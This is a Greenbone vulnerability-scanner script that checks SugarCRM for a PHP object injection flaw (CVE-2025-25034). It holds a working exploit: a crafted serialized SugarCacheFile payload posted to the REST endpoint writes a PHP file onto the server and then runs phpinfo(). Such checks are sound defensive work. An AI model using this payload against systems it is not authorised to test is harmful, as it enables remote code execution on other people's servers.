# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sugarcrm:sugarcrm";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106124");
  script_version("2025-07-29T05:44:59+0000");
  script_tag(name:"last_modification", value:"2025-07-29 05:44:59 +0000 (Tue, 29 Jul 2025)");
  script_tag(name:"creation_date", value:"2016-07-08 15:37:30 +0700 (Fri, 08 Jul 2016)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2025-25034");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SugarCRM PHP Object Injection Vulnerability (Jun 2016)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sugarcrm_http_detect.nasl");
  script_mandatory_keys("sugarcrm/detected");

  script_tag(name:"summary", value:"SugarCRM is prone to a PHP injection vulnerability.");

  script_tag(name:"vuldetect", value:"Try to execute phpinfo()");

  script_tag(name:"insight", value:"User input passed through the 'rest_data' request parameter is
  not properly sanitized before being used in a call to the 'unserialize()' function. This can be
  exploited to inject arbitrary PHP objects into the application scope, and could allow
  unauthenticated attackers to execute arbitrary PHP code via specially crafted serialized
  objects.");

  script_tag(name:"affected", value:"SugarCRM versions 6.5.x, 6.7.x, 7.5.x, 7.6.x and 7.7.x.");

  script_tag(name:"solution", value:"Update to version 6.5.24, 6.7.13, 7.5.2.5, 7.6.2.2, 7.7.1.0 or
  later.");

  script_xref(name:"URL", value:"http://karmainsecurity.com/KIS-2016-07");
  script_xref(name:"URL", value:"https://web.archive.org/web/20160508053502/http://www.sugarcrm.com/security/sugarcrm-sa-2016-001");
  script_xref(name:"URL", value:"https://web.archive.org/web/20160725194502/http://www.sugarcrm.com/security/sugarcrm-sa-2016-008");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40344");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("misc_func.inc");

function do_ex( dir, file, ex, port )
{
  f_len = strlen( file ) + 2;
  ex_len = strlen( ex );

  if( dir == "/" )
    dir = "";

  payload_serialized = 'O%3A%2B14%3A%22SugarCacheFile%22%3A23%3A%7BS%3A17%3A%22%5C00*%5C00_cacheFileName%22%3Bs%3A' + f_len  +'%3A%22' +
                       '..' +  urlencode( str:file ) +
                       '%22%3BS%3A16%3A%22%5C00*%5C00_cacheChanged%22%3Bb%3A1%3BS%3A14%3A%22%5C00*%5C00_localStore%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A19%3A%22' +
                       urlencode( str:ex ) + '%22%3B%7D%7D';

  data = 'method=login&input_type=Serialize&rest_data=' + payload_serialized;

  req = http_post_put_req( port:port,
                       url: dir + '/service/v4/rest.php',
                       data:data,
                       add_headers:make_array( 'Content-Type','application/x-www-form-urlencoded' )
                     );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf && buf =~ "HTTP/1\.. 200" )
  {
    req = http_get( item:dir + file, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    return buf;
  }
}

if (!port = get_app_port(cpe: CPE))
  exit(0);

if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

vt_strings = get_vt_strings();

ex = '<?php phpinfo(); ?>';
file = '/custom/' + vt_strings["default_rand"] + '.php';

buf = do_ex( dir:dir, file:file, ex:ex, port:port );

if( "<title>phpinfo()" >< buf )
{
  ex = '';
  do_ex( dir:dir, file:file, ex:ex, port:port );
  report = 'By uploading the file ' + file + ' it was possible to execute `phpinfo()` on the remote host. Please delete this file.';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 0 );

